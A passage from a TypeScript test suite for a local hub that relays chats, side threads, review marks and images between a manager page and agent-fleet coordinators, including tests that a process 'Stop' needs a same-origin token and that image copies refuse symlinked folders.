    };

    await post({ text: "status?" });
    expect([await takeover("/f/p/state.json"), await takeover("/f/manager/state.json")]).toEqual([undefined, undefined]);
    const by: Party = { pid: 222, started: "2026-10-12T13:55:01+00:00", session: "sess-new" };
    const from: Party = { pid: 111, started: null, session: "sess-old" };
    const recorded = recordTakeover(machine(env), root, by, from);
    expect([recorded.event, recorded.message, recorded.faults]).toEqual([true, 2, []]);
    await new Promise((wake) => setTimeout(wake, 2100));
    const shown = await takeover("/f/p/state.json");
    expect(shown).toMatchObject({ id: 2, by: { ...by }, from: { ...from } });
    expect(await takeover("/f/manager/state.json")).toEqual(shown);
    // The line is the hub's, to the user: the chat serves it as any other.
    expect(asArray((await request("GET", "/f/p/chat?after=1")).body["messages"])?.map((x) => [asObject(x)?.["from"], asObject(x)?.["to"]])).toEqual([["fleet-hub", ["user"]]]);
    const next = await post({ text: "who hosts this now?" });
    await new Promise((wake) => setTimeout(wake, 2100));
    expect(await takeover("/f/p/state.json")).toEqual(shown);
    // The new host's watch printed it and exited: its cursor passed the message.
    writeFileSync(join(root, "watch-coordinator.cursor"), String(next.body["id"]));
    await new Promise((wake) => setTimeout(wake, 2100));
    expect([await takeover("/f/p/state.json"), await takeover("/f/manager/state.json")]).toEqual([undefined, undefined]);
  }, 15000);
});

describe("the index and the manager", () => {
  test("the index lists every fleet of the registry, and its stream follows them", async () => {
    await start();
    const page = await fetch(`http://127.0.0.1:${port}/`);
    const html = await page.text();
    expect(page.status).toBe(200);
    expect(html).toContain('"path": "/f/p/"');
    const stream = await Stream.open("/events");
    const first = data(await stream.nextOf("fleets"));
    const fleets = asArray(asObject(asArray(first["machines"])?.[0])?.["fleets"]) ?? [];
    expect(fleets.map((f) => [asObject(f)?.["id"], asObject(f)?.["status"]])).toEqual([["p", "running"]]);
    const other = join(base, "infra", "coordinator");
    mkdirSync(other, { recursive: true });
    writeState(other, [], { project: "infra" });
    register(other, "infra");
    const next = data(await stream.nextOf("fleets"));
    const ids = (asArray(asObject(asArray(next["machines"])?.[0])?.["fleets"]) ?? []).map((f) => asObject(f)?.["id"]);
    expect(ids.sort()).toEqual(["infra", "p"]);
    stream.close();
    const api = await request("GET", "/api/fleets");
    expect((asArray(api.body["fleets"]) ?? []).length).toBe(2);
  });

  test("several open index pages cost one build of the fleets per second, not one each", async () => {
    await start();
    const hub = running?.hub;

    if (hub === undefined) throw new Error("no hub");
    const build = hub.indexPayload.bind(hub);
    let builds = 0;

    hub.indexPayload = () => {
      builds += 1;

      return build();
    };

    const streams = await Promise.all([1, 2, 3, 4, 5].map(() => Stream.open("/events")));
    await Promise.all(streams.map((s) => s.nextOf("fleets")));
    builds = 0;
    await Bun.sleep(2500);

    for (const s of streams) s.close();
    // 2 or 3 ticks in 2.5 s; a build per stream per tick would be 10 to 15
    expect(builds).toBeGreaterThanOrEqual(2);
    expect(builds).toBeLessThanOrEqual(3);
  });

  test("the manager's stream holds every coordinator and follows what they do; its links to them resolve", async () => {
    const manager = join(base, "m", "manager");
    mkdirSync(manager, { recursive: true });
    writeState(manager, [], { role: "manager", project: "all" });
    register(manager, "manager");
    await start();
    const stream = await Stream.open("/f/manager/events");
    await stream.next();
    const state = data(await stream.nextOf("state"));
    expect((asArray(state["coordinators"]) ?? []).map((c) => [asObject(c)?.["id"], asObject(c)?.["now"]])).toEqual([["p", "n"]]);
    fleet(["state", root, "set", "--now", "landing the adapter", "--no-render"], env);
    const next = data(await stream.nextOf("state"));
    expect(asObject(asArray(next["coordinators"])?.[0])?.["now"]).toBe("landing the adapter");
    stream.close();
    expect(collapse("/f/manager/f/p/chat")).toBe("/f/p/chat");
    expect((await request("GET", "/f/manager/f/p/chat")).status).toBe(200);
  });

  test("the manager's state.json, which its page polls while the stream reconnects, is the view the stream sends", async () => {
    const manager = join(base, "m", "manager");
    mkdirSync(manager, { recursive: true });
    writeState(manager, [], { role: "manager", project: "all" });
    register(manager, "manager");
    await start();
    const stream = await Stream.open("/f/manager/events");
    await stream.next();
    const streamed = data(await stream.nextOf("state"));
    stream.close();
    const polled = await request("GET", "/f/manager/state.json");
    expect(polled.headers.get("Cache-Control")).toBe("no-store");
    expect(polled.headers.get("Content-Type")).toStartWith("application/json");
    expect((asArray(polled.body["coordinators"]) ?? []).map((c) => asObject(c)?.["id"])).toEqual(["p"]);
    expect(polled.body).toEqual(streamed);
  });

  test("Stop on an orphaned process is the manager's page's alone, and a hub that does not look at processes stops nothing", async () => {
    const manager = join(base, "m", "manager");
    mkdirSync(manager, { recursive: true });
    writeState(manager, [], { role: "manager", project: "all" });
    register(manager, "manager");
    await start();
    const self = `http://127.0.0.1:${port}`;
    const page = await request("GET", "/f/manager/", undefined, { "Sec-Fetch-Dest": "document" });
    const token = /<meta name="fleet-stop-token" content="([^"]+)">/.exec(asString(page.body["text"]) ?? "")?.[1] ?? "";
    expect(token.length).toBeGreaterThan(20);
    expect([page.headers.get("Cross-Origin-Opener-Policy"), page.headers.get("Content-Security-Policy"), page.headers.get("X-Frame-Options")]).toEqual(["same-origin", "frame-ancestors 'none'", "DENY"]);
    expect(asString((await request("GET", "/f/manager/", undefined, { "Sec-Fetch-Dest": "iframe" })).body["text"])).not.toContain("<meta name=\"fleet-stop-token\"");
    expect(asString((await request("GET", "/f/manager/")).body["text"])).not.toContain("<meta name=\"fleet-stop-token\"");
    expect(asString((await request("GET", "/f/p/", undefined, { "Sec-Fetch-Dest": "document" })).body["text"])).not.toContain("<meta name=\"fleet-stop-token\"");
    const own = { Origin: self, "Sec-Fetch-Site": "same-origin", "X-Fleet-Stop-Token": token };

    const refused: readonly (readonly [Record<string, string>, string])[] = [
      [{}, "a Stop comes only from the manager's page on this hub"],
      [{ "X-Fleet-Stop-Token": token }, "a Stop comes only from the manager's page on this hub"],
      [{ Origin: self, "X-Fleet-Stop-Token": token }, "a Stop comes only from the manager's page on this hub"],
      [{ Origin: `http://localhost:${port}`, "Sec-Fetch-Site": "same-origin", "X-Fleet-Stop-Token": token }, "a Stop comes only from the manager's page on this hub"],
      [{ Origin: self, "Sec-Fetch-Site": "same-origin" }, "the Stop token is missing or stale: reload the manager's page"],
      [{ ...own, "X-Fleet-Stop-Token": `${token.slice(0, -1)}${token.endsWith("x") ? "y" : "x"}` }, "the Stop token is missing or stale: reload the manager's page"],
    ];

    for (const [headers, why] of refused) {
      const got = await post({ pid: 4242, started: 1 }, headers, "/f/manager/orphans/stop");
      expect([headers, got.status, got.body["error"]]).toEqual([headers, 403, why]);
    }

    const coordinator = await post({ pid: 4242, started: 1 }, own, "/f/p/orphans/stop");
    expect([coordinator.status, coordinator.body["error"]]).toEqual([403, "orphaned processes are stopped from the manager's page"]);
    expect((await post({ pid: "4242" }, own, "/f/manager/orphans/stop")).status).toBe(400);
    expect((await post({ pid: 1, started: 1 }, own, "/f/manager/orphans/stop")).status).toBe(400);
    const off = await post({ pid: 4242, started: 1 }, own, "/f/manager/orphans/stop");
    expect([off.status, off.body["error"]]).toEqual([409, "this hub does not look at the machine's processes (FLEET_DISCOVER=0 or FLEET_ORPHANS=0)"]);
    const polled = await request("GET", "/f/manager/state.json");
    expect(polled.body["orphans"]).toBeUndefined();
  });
});

describe("the user's word to a coordinator on the manager's page", () => {
  let manager: string;

  let infra: string;

  const fields = (m: { readonly stored: JsonObject } | undefined, ...keys: string[]): unknown[] => keys.map((k) => m?.stored[k]);

  beforeEach(async () => {
    manager = join(base, "m", "manager");
    mkdirSync(manager, { recursive: true });
    writeState(manager, [{ id: "a9", name: "scout" }], { role: "manager", project: "all" });
    register(manager, "manager");
    infra = join(base, "infra", "coordinator");
    mkdirSync(infra, { recursive: true });
    writeState(infra, [], { project: "infra" });
    register(infra, "infra");
    await start();
  });

  const toManager = (payload: JsonObject): Promise<Answer> => post(payload, {}, "/f/manager/chat");

  const relay = (): void => {
    running?.hub.relay();
  };

  test("is delivered into the coordinator's own chat, as the user's to it, with where it was written", async () => {
    const sent = await toManager({ text: "@p hello" });
    expect(sent.status).toBe(201);
    expect([sent.body["id"], sent.body["to"], sent.body["delivered"]]).toEqual([1, ["p"], [{ fleet: "p", id: 1 }]]);
    const got = readChat(root);
    expect(got.length).toBe(1);
    expect(fields(got[0], "id", "from", "to", "text", "re", "via")).toEqual([1, "user", ["coordinator"], "@p hello", null, { fleet: "manager", id: 1 }]);
    expect(readChat(infra)).toEqual([]);
  });

  test("the coordinator's reply in its own chat is mirrored once onto the manager's page, as its answer to the original", async () => {
    await toManager({ text: "@p hello" });
    say("a1", "a worker's word is not the coordinator's", { re: 1 });
    say("coordinator", "hi", { re: 1 });
    say("coordinator", "not a reply");
    relay();
    relay();
    const mirrored = readChat(manager).filter((m) => m.from !== "user");
    expect(mirrored.map((m) => fields(m, "id", "from", "to", "text", "re", "via"))).toEqual([[2, "p", ["user"], "hi", 1, { fleet: "p", id: 3 }]]);
    await running?.stop();
    running = undefined;
    await start();
    relay();
    expect(readChat(manager).length).toBe(2);
  });

  test("the hub mirrors by itself, without being asked", async () => {
    await toManager({ text: "@p hello" });
    say("coordinator", "hi", { re: 1 });

    for (let tries = 0; tries < 40 && readChat(manager).length < 2; tries += 1) await new Promise((resolve) => setTimeout(resolve, 100));
    expect(readChat(manager).at(-1)?.text).toBe("hi");
  });

  test("a message to two coordinators reaches both chats, and each answer comes back under its fleet's name", async () => {
    say("coordinator", "an earlier line of p's own");
    const sent = await toManager({ text: "@p and @infra, status?" });
    expect(sent.body["delivered"]).toEqual([
      { fleet: "p", id: 2 },
      { fleet: "infra", id: 1 },
    ]);
    expect(fields(readChat(infra)[0], "to", "via")).toEqual([["coordinator"], { fleet: "manager", id: 1 }]);
    say("coordinator", "p: green", { re: 2 });
    const answer = append(machine(env), infra, { sender: "coordinator", text: "infra: red", re: 1 }, "2026-01-01T00:00:00+00:00");

    if (answer instanceof ChatError) throw new Error(answer.reason);
    relay();
    expect(readChat(manager).slice(1).map((m) => fields(m, "from", "text", "re", "via")).sort()).toEqual([
      ["infra", "infra: red", 1, { fleet: "infra", id: 2 }],
      ["p", "p: green", 1, { fleet: "p", id: 3 }],
    ]);
  });

  test("a side chat and its quote go across as a side chat of the coordinator's, and its answer comes back inside it", async () => {
    const opened = await toManager({ text: "@p why this?", side: "new", quote: { text: "keep both", from: "p's decision Invoice schema" } });
    expect([opened.body["side"], opened.body["delivered"]]).toEqual([1, [{ fleet: "p", id: 1 }]]);
    expect(fields(readChat(root)[0], "side", "quote", "via")).toEqual([1, { text: "keep both", from: "p's decision Invoice schema" }, { fleet: "manager", id: 1 }]);
    say("coordinator", "an aside of p's own");
    const more = await toManager({ text: "@p and the other one?", side: 1 });
    expect(more.body["delivered"]).toEqual([{ fleet: "p", id: 3 }]);
    expect(fields(readChat(root)[2], "side", "via")).toEqual([1, { fleet: "manager", id: 2 }]);
    say("coordinator", "both", { re: 3 });
    relay();
    expect(fields(readChat(manager).at(-1), "from", "re", "side", "text")).toEqual(["p", 2, 1, "both"]);
  });

  const fleetSays = (dir: string, text: string, re: number): void => {
    const said = append(machine(env), dir, { sender: "coordinator", text, re }, "2026-01-01T00:00:00+00:00");

    if (said instanceof ChatError) throw new Error(said.reason);
  };

  test("a side chat on infra's decision is infra's: every message goes to infra, @ or not, and a cited fleet gets that one message too", async () => {
    const perf = join(base, "perf", "coordinator");
    mkdirSync(perf, { recursive: true });
    writeState(perf, [], { project: "perf" });
    register(perf, "perf");
    const opened = await toManager({ text: "why both?", side: "new", quote: { text: "keep both", from: "Invoice schema, in infra", at: { hash: "#decision/infra/d1", anchor: "dv-info" } } });
    expect([opened.body["to"], opened.body["delivered"]]).toEqual([["infra"], [{ fleet: "infra", id: 1 }]]);
    fleetSays(infra, "because", 1);
    relay();
    expect(fields(readChat(manager).at(-1), "id", "from", "side")).toEqual([2, "infra", 1]);
    expect((await post({ text: "and the cost?", side: 1 }, {}, "/f/manager/chat/preview")).body["to"]).toEqual(["infra"]);
    const more = await toManager({ text: "and the cost?", side: 1 });
    expect([more.body["to"], more.body["delivered"]]).toEqual([["infra"], [{ fleet: "infra", id: 3 }]]);
    const reply = await toManager({ text: "fine", re: 2 });
    expect([reply.body["to"], reply.body["side"], reply.body["delivered"]]).toEqual([["infra"], 1, [{ fleet: "infra", id: 4 }]]);
    const cited = await toManager({ text: "@perf what would it cost to run?", side: 1 });
    expect([cited.body["to"], cited.body["delivered"]]).toEqual([["infra", "perf"], [{ fleet: "infra", id: 5 }, { fleet: "perf", id: 1 }]]);
    fleetSays(perf, "a cent a page", 1);
    relay();
    expect(fields(readChat(manager).at(-1), "from", "re", "side", "text")).toEqual(["perf", 5, 1, "a cent a page"]);
    const toPerf = await toManager({ text: "per document?", re: 6 });
    expect([toPerf.body["to"], toPerf.body["side"], toPerf.body["delivered"]]).toEqual([["infra", "perf"], 1, [{ fleet: "infra", id: 6 }, { fleet: "perf", id: 3 }]]);
    const after = await toManager({ text: "thanks", side: 1 });
    expect([after.body["to"], after.body["delivered"]]).toEqual([["infra"], [{ fleet: "infra", id: 7 }]]);
    const noted = await toManager({ text: "@manager note this", side: 1 });
    expect([noted.body["to"], noted.body["delivered"]]).toEqual([["infra", "manager"], [{ fleet: "infra", id: 8 }]]);
    const said = append(machine(env), manager, { sender: "manager", text: "noted", re: 9 }, "2026-01-01T00:00:00+00:00");

    if (said instanceof ChatError) throw new Error(said.reason);
    const back = await toManager({ text: "and file it", re: said.id });
    expect([back.body["to"], back.body["side"], back.body["delivered"]]).toEqual([["infra", "manager"], 1, [{ fleet: "infra", id: 9 }]]);
    expect((await toManager({ text: "last one", side: 1 })).body["to"]).toEqual(["infra"]);
  });

  test("a side chat opened with @p is p's: a follow-up without the @ goes to p, and p's answer comes back inside it", async () => {
    await toManager({ text: "@p what did you try?", side: "new" });
    say("coordinator", "these three", { re: 1 });
    relay();
    expect(fields(readChat(manager).at(-1), "id", "from", "side")).toEqual([2, "p", 1]);
    const more = await toManager({ text: "and models?", side: 1 });
    expect([more.status, more.body["to"], more.body["delivered"]]).toEqual([201, ["p"], [{ fleet: "p", id: 3 }]]);
    expect(fields(readChat(root)[2], "from", "to", "text", "side", "via")).toEqual(["user", ["coordinator"], "and models?", 1, { fleet: "manager", id: 3 }]);
    say("coordinator", "none yet", { re: 3 });
    relay();
    expect(fields(readChat(manager).at(-1), "from", "re", "side", "text")).toEqual(["p", 3, 1, "none yet"]);
  });

  test("a side chat on a fleet's message in the chat is that fleet's", async () => {
    await toManager({ text: "@p hello" });
    say("coordinator", "hi", { re: 1 });
    relay();
    const opened = await toManager({ text: "what did you mean?", side: "new", quote: { text: "hi", from: "p", at: { hash: "#plan", message: "2" } } });
    expect([opened.body["to"], opened.body["delivered"]]).toEqual([["p"], [{ fleet: "p", id: 3 }]]);
  });

  test("a side chat on a worker's row stays the manager's: `#agent-<x>` there is a worker, not a fleet", async () => {
    const opened = await toManager({ text: "who is this?", side: "new", quote: { text: "scout", from: "the fleet table", at: { hash: "#agent-p", anchor: "agent-p" } } });
    expect([opened.body["to"], opened.body["delivered"]]).toEqual([["manager"], undefined]);
  });

  test("a fleet is named by its id exactly, or by an alias only one fleet has; an ambiguous alias names no owner", async () => {
    const reg = machine(env).registry;

    const renamed = (dir: string, name: string): void => {
      const done = reg.rename(dir, name);

      if ("why" in done) throw new Error(done.why);
    };

    // p becomes z, then a; infra becomes z, then b: both keep the alias z.
    renamed(root, "z");
    renamed(root, "a");
    renamed(infra, "z");
    renamed(infra, "b");
    const quoting = (fleet: string): JsonObject => ({ text: "keep both", from: "Invoice schema", at: { hash: `#decision/${fleet}/d1`, anchor: "dv-info" } });
    expect((await toManager({ text: "why?", side: "new", quote: quoting("z") })).body["to"]).toEqual(["manager"]);
    expect((await toManager({ text: "and this?", side: "new", quote: quoting("infra") })).body["to"]).toEqual(["b"]);
    // An id wins over another fleet's alias: infra, renamed to p, is p; a (once p) keeps p as an alias.
    renamed(infra, "p");
    expect((await toManager({ text: "and p?", side: "new", quote: quoting("p") })).body["to"]).toEqual(["p"]);
    expect(reg.live().find((e) => e.id === "a")?.aliases).toContain("p");
  });

  test("a side chat on the manager's own things stays the manager's, and the main chat is as before", async () => {
    await toManager({ text: "about this", side: "new", quote: { text: "a line", from: "the plan", at: { hash: "#plan" } } });
    const more = await toManager({ text: "and that", side: 1 });
    expect([more.body["to"], more.body["delivered"]]).toEqual([["manager"], undefined]);
    await toManager({ text: "@p hello" });
    const own = await toManager({ text: "and one more thing", re: 3 });
    expect([own.body["to"], own.body["delivered"]]).toEqual([["manager"], undefined]);
  });

  test("a quote's place goes across: the fleet's own decision as its own page's, anything else on the manager's page", async () => {
    await toManager({ text: "@p why?", quote: { text: "per line", from: "Rounding, in p", at: { hash: "#decision/p/d1", anchor: "dv-info" } } });
    await toManager({ text: "@p and this?", quote: { text: "halfway", from: "the chat", at: { hash: "#plan", message: "1" } } });
    expect(readChat(root).map((m) => asObject(m.quote)?.["at"])).toEqual([
      { hash: "#decision/d1", anchor: "dv-info" },
      { hash: "#plan", message: "1", page: "/f/manager/" },
    ]);
    expect(readChat(manager).map((m) => asObject(m.quote)?.["at"])).toEqual([
      { hash: "#decision/p/d1", anchor: "dv-info" },
      { hash: "#plan", message: "1" },
    ]);
  });

  const marks = (hash: string): JsonObject => ({
    decision: { id: "d30", ref: "D30", title: "Cache policy", revision: "2026-10-10T09:12:00Z" },
    at: { hash },
    items: [
      { n: 1, kind: "comment", quote: { text: "fourteen days", prefix: "keep for ", suffix: "", hint: "a paragraph", blocks: [{ exact: "fourteen days", prefix: "keep for ", suffix: "" }] }, comment: "why?" },
      { n: 2, kind: "general", comment: "fine otherwise" },
    ],
  });

  test("a batch of marks on a fleet's decision goes to that fleet only, its place as the fleet's own page has it, and the marks it answers come back", async () => {
    const asked = await post({ text: "2 marks on D30", marks: marks("#decision/p/d30") }, {}, "/f/manager/chat/preview");
    expect([asked.status, asked.body["to"]]).toEqual([200, ["p"]]);
    const sent = await toManager({ text: "2 marks on D30", marks: marks("#decision/p/d30") });
    expect([sent.status, sent.body["to"], sent.body["delivered"]]).toEqual([201, ["p"], [{ fleet: "p", id: 1 }]]);
    expect(sent.body["marks"]).toEqual(marks("#decision/p/d30"));
    expect(fields(readChat(root)[0], "to", "marks", "via")).toEqual([["coordinator"], marks("#decision/d30"), { fleet: "manager", id: 1 }]);
    const answer = append(machine(env), root, { sender: "coordinator", text: "seven days then", re: 1, mark: [1, 2] }, "2026-01-01T00:00:00+00:00");

    if (answer instanceof ChatError) throw new Error(answer.reason);
    relay();
    expect(fields(readChat(manager).at(-1), "from", "re", "mark", "keep", "via")).toEqual(["p", 1, [1, 2], undefined, { fleet: "p", id: 2 }]);
    const kept = append(machine(env), root, { sender: "coordinator", text: "kept", re: 1, mark: [2], keep: "the legal minimum" }, "2026-01-01T00:00:00+00:00");

    if (kept instanceof ChatError) throw new Error(kept.reason);
    relay();
    expect(fields(readChat(manager).at(-1), "from", "re", "mark", "keep", "via")).toEqual(["p", 1, [2], "the legal minimum", { fleet: "p", id: 3 }]);
  });

  test("a batch's mark images on the manager's page are copied into the fleet it goes to, under the same paths", async () => {
    const bytes = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from("relayed")]);
    const res = await fetch(`http://127.0.0.1:${String(port)}/f/manager/attachments`, { method: "POST", headers: { "Content-Type": "image/png", ...(await pageHeaders("/f/manager/chat")) }, body: bytes });
    const path = asString(asObject(JSON.parse(await res.text()))?.["path"]) ?? "";
    expect([res.status, existsSync(join(manager, path))]).toEqual([201, true]);
    const batch = marks("#decision/p/d30");
    const items = (asArray(batch["items"]) ?? []).map((item, i) => (i === 1 ? { ...asObject(item), images: [path] } : item));
    const sent = await toManager({ text: "2 marks on D30", marks: { ...batch, items } });
    expect([sent.status, sent.body["delivered"]]).toEqual([201, [{ fleet: "p", id: 1 }]]);
    expect(asObject(asArray(asObject(readChat(root)[0]?.stored["marks"])?.["items"])?.[1])?.["images"]).toEqual([path]);
    expect(readFileSync(join(root, path)).equals(bytes)).toBe(true);
  });

  /** An image uploaded on the manager's page, as its page does: its path there. */
  async function managerImage(bytes: Buffer): Promise<string> {
    const res = await fetch(`http://127.0.0.1:${String(port)}/f/manager/attachments`, { method: "POST", headers: { "Content-Type": "image/png", ...(await pageHeaders("/f/manager/chat")) }, body: bytes });

    return asString(asObject(JSON.parse(await res.text()))?.["path"]) ?? "";
  }

  const png = (tail: string): Buffer => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from(tail)]);

  test("a message's own images on the manager's page are copied into the fleet it goes to, under the same paths", async () => {
    const bytes = png("own");
    const path = await managerImage(bytes);
    const sent = await toManager({ text: "@p this screen", images: [path] });
    expect([sent.status, sent.body["delivered"]]).toEqual([201, [{ fleet: "p", id: 1 }]]);
    expect(readChat(root)[0]?.stored["images"]).toEqual([path]);
    expect(readFileSync(join(root, path)).equals(bytes)).toBe(true);
  });

  test("the copy never writes through a symlinked attachments folder: the delivered message names no image, and its watch line none", async () => {
    const path = await managerImage(png("through"));
    const outside = join(base, "outside");
    mkdirSync(outside);
    symlinkSync(outside, join(root, "attachments"));
    const batch = marks("#decision/p/d30");
    const items = (asArray(batch["items"]) ?? []).map((item, i) => (i === 1 ? { ...asObject(item), images: [path] } : item));
    const sent = await toManager({ text: "2 marks on D30", images: [path], marks: { ...batch, items } });
    expect([sent.status, sent.body["delivered"]]).toEqual([201, [{ fleet: "p", id: 1 }]]);
    const got = readChat(root)[0];
    expect([got?.stored["images"], asObject(asArray(asObject(got?.stored["marks"])?.["items"])?.[1])?.["images"]]).toEqual([undefined, undefined]);
    expect(readdirSync(outside)).toEqual([]);
    expect(renderLines(machine(env), root, readChat(root)).join("\n")).not.toContain("[image");
  });

  test("a mark that was an image alone, whose image did not reach the fleet, is delivered with words that say so", async () => {
    const path = await managerImage(png("alone"));
    const outside = join(base, "outside");
    mkdirSync(outside);
    symlinkSync(outside, join(root, "attachments"));
    const batch = marks("#decision/p/d30");
    const items = (asArray(batch["items"]) ?? []).map((item, i) => (i === 1 ? { n: 2, kind: "general", images: [path] } : item));
    const sent = await toManager({ text: "2 marks on D30", marks: { ...batch, items } });
    expect([sent.status, sent.body["delivered"]]).toEqual([201, [{ fleet: "p", id: 1 }]]);
    expect(asArray(asObject(readChat(root)[0]?.stored["marks"])?.["items"])?.[1]).toEqual({ n: 2, kind: "general", comment: "(an image that did not reach this fleet)" });
  });

  test("an image already at its place in the fleet is kept when it is the same bytes; a symlink or other bytes there are left as they are, and the image is not named", async () => {
    const same = png("same");
    const [a, b, c] = [await managerImage(same), await managerImage(png("linked")), await managerImage(png("other"))];
    mkdirSync(join(root, "attachments"));
    writeFileSync(join(root, a), same);
    symlinkSync(join(base, "elsewhere.png"), join(root, b));
    writeFileSync(join(root, c), png("not the manager's"));
    const sent = await toManager({ text: "@p three screens", images: [a, b, c] });
    expect(sent.status).toBe(201);
    expect(readChat(root)[0]?.stored["images"]).toEqual([a]);
    expect([existsSync(join(base, "elsewhere.png")), readFileSync(join(root, c)).equals(png("not the manager's"))]).toEqual([false, true]);
  });

  test("a batch in its decision's page thread is delivered into the same thread in the fleet's chat, and its answer comes back there", async () => {
    const opener = await toManager({ text: "2 marks on D30", marks: marks("#decision/p/d30") });
    const next = await toManager({ text: "1 more", marks: marks("#decision/p/d30"), side: opener.body["id"] ?? null });
    expect([next.status, next.body["side"], next.body["to"], next.body["delivered"]]).toEqual([201, 1, ["p"], [{ fleet: "p", id: 2 }]]);
    const word = await toManager({ text: "and a word", side: 1 });
    expect([word.status, word.body["to"], word.body["delivered"]]).toEqual([201, ["p"], [{ fleet: "p", id: 3 }]]);
    expect(readChat(root).map((m) => fields(m, "id", "side", "via"))).toEqual([
      [1, undefined, { fleet: "manager", id: 1 }],
      [2, 1, { fleet: "manager", id: 2 }],
      [3, 1, { fleet: "manager", id: 3 }],
    ]);
    const answer = append(machine(env), root, { sender: "coordinator", text: "done", re: 2, mark: [1] }, "2026-01-01T00:00:00+00:00");

    if (answer instanceof ChatError) throw new Error(answer.reason);
    relay();
    expect(fields(readChat(manager).at(-1), "from", "re", "side", "mark")).toEqual(["p", 2, 1, [1]]);
    const toOpener = append(machine(env), root, { sender: "coordinator", text: "first answered", re: 1, mark: [2] }, "2026-01-01T00:00:00+00:00");

    if (toOpener instanceof ChatError) throw new Error(toOpener.reason);
    expect(toOpener.side).toBe(1);
    relay();
    expect(fields(readChat(manager).at(-1), "from", "re", "side", "mark")).toEqual(["p", 1, 1, [2]]);
    const loose = await toManager({ text: "why?", side: "new", quote: { text: "x", at: { hash: "#plan" } } });
    const stray = await toManager({ text: "x", marks: marks("#decision/p/d30"), side: loose.body["id"] ?? null });
    expect([stray.status, stray.body["error"]]).toEqual([400, "a batch of marks is a message of its own: no decision, quote or side chat with it"]);
    expect((await toManager({ text: "x", marks: marks("#decision/p/d30"), side: 3 })).body["error"]).toBe("no side chat #3");
  });

  test("a withdrawal rides in a batch, posted and delivered with the marks it withdraws", async () => {
    const gone = { ...marks("#decision/p/d30"), items: [], withdrawn: [2] };
    const sent = await toManager({ text: "Luiz withdrew comment #2", marks: gone });
    expect([sent.status, sent.body["to"], sent.body["marks"], sent.body["delivered"]]).toEqual([201, ["p"], gone, [{ fleet: "p", id: 1 }]]);
    expect(fields(readChat(root)[0], "marks")).toEqual([{ ...gone, at: { hash: "#decision/d30" } }]);
  });

  test("one batch per recipient: each lands with its one fleet, delivered as the user's to its host", async () => {
    writeState(join(base, "infra", "coordinator"), [], { project: "infra" });
    const owner = await toManager({ text: "3 marks, 1 for @infra", marks: { ...marks("#decision/p/d30"), to: "p" } });
    const cited = await toManager({ text: "1 mark for @infra", marks: { ...marks("#decision/p/d30"), to: "infra" } });
    expect([owner.status, owner.body["to"], owner.body["delivered"]]).toEqual([201, ["p"], [{ fleet: "p", id: 1 }]]);
    expect([cited.status, cited.body["to"], cited.body["delivered"]]).toEqual([201, ["infra"], [{ fleet: "infra", id: 1 }]]);
    expect(fields(readChat(root)[0], "to", "marks")).toEqual([["coordinator"], { ...marks("#decision/d30"), to: "coordinator" }]);
    const there = readChat(join(base, "infra", "coordinator"));
    expect([there.length, asObject(there[0]?.stored["marks"])?.["to"], asObject(asObject(there[0]?.stored["marks"])?.["at"])?.["hash"]]).toEqual([1, "coordinator", "#decision/p/d30"]);
    const neither = await toManager({ text: "1 mark", marks: { ...marks("#decision/p/d30"), to: "infra" } });
    expect([neither.status, neither.body["error"]]).toEqual([400, "a batch goes to the decision's owner (p) or to an agent its text cites, and infra is neither"]);
  });

  test("a mark on a fleet decision's own text keeps its field through the post and the delivery", async () => {
    const field = { ...marks("#decision/p/d30"), items: [{ n: 1, kind: "question", quote: { text: "7 days", prefix: "", suffix: "", hint: "option B's consequence", field: "option:B:consequence", blocks: [{ exact: "7 days", prefix: "", suffix: "" }] }, comment: "why seven?" }] };
    const sent = await toManager({ text: "1 mark on D30", marks: field });
    expect([sent.status, sent.body["marks"], sent.body["delivered"]]).toEqual([201, field, [{ fleet: "p", id: 1 }]]);
    expect(fields(readChat(root)[0], "marks")).toEqual([{ ...field, at: { hash: "#decision/d30" } }]);
  });

  test("a batch on the manager's own decision goes to the manager and the fleets it cites, and a malformed one is refused with its reason", async () => {
    const own = await toManager({ text: "1 mark", marks: marks("#decision/d30") });
    expect([own.status, own.body["to"], own.body["delivered"]]).toEqual([201, ["manager"], undefined]);
    const cited = await toManager({ text: "1 mark, @p too", marks: marks("#decision/d30") });
    expect([cited.status, cited.body["to"], cited.body["delivered"]]).toEqual([201, ["manager", "p"], [{ fleet: "p", id: 1 }]]);
    const onFleet = await post({ text: "2 marks", marks: marks("#decision/d30") });
    expect([onFleet.status, onFleet.body["to"]]).toEqual([201, ["coordinator"]]);

    for (const path of ["/f/manager/chat", "/f/manager/chat/preview"]) {
      const bad = await post({ text: "x", marks: { ...marks("#decision/p/d30"), items: [] } }, {}, path);
      expect([bad.status, asString(bad.body["error"])?.startsWith("marks are {decision, at, items}: ")]).toEqual([400, true]);
      const elsewhere = await post({ text: "x", marks: marks("#decision/p/d31") }, {}, path);
      expect([elsewhere.status, elsewhere.body["error"]]).toEqual([400, "marks are {decision, at, items}: at.hash #decision/p/d31 is not the place of decision d30"]);

      for (const more of [{ decision: "d30" }, { quote: { text: "q" } }, { side: "new" }]) {
        const mixed = await post({ text: "x", marks: marks("#decision/p/d30"), ...more }, {}, path);
        expect([mixed.status, mixed.body["error"]]).toEqual([400, "a batch of marks is a message of its own: no decision, quote or side chat with it"]);
      }
    }

    expect(readChat(manager).length).toBe(2);
  });

  test("a ride-along batch on the manager's page is placed on the answered decision itself, not on a fleet's", async () => {
    writeState(manager, [{ id: "a9", name: "scout" }], { role: "manager", project: "all", decisions: [{ id: "d30", kind: "decision", title: "Cache policy", question: "q", status: "open", resolution: null, opened: "2026-01-01T00:00:00+00:00" }] });
    const elsewhere = await toManager({ text: "B", decision: "d30", batch: { text: "2 marks", marks: marks("#decision/p/d30") } });
    expect([elsewhere.status, elsewhere.body["error"]]).toEqual([400, "the batch's place #decision/p/d30 is not the answered decision's own, #decision/d30"]);
    expect([readChat(manager), readChat(root)]).toEqual([[], []]);
    const own = await toManager({ text: "B", decision: "d30", batch: { text: "2 marks", marks: marks("#decision/d30") } });
    expect([own.status, asObject(own.body["batch"])?.["to"]]).toEqual([201, ["manager"]]);
  });

  test("a ride-along batch on the manager's own decision is delivered to the fleets it cites only once the answer is taken", async () => {
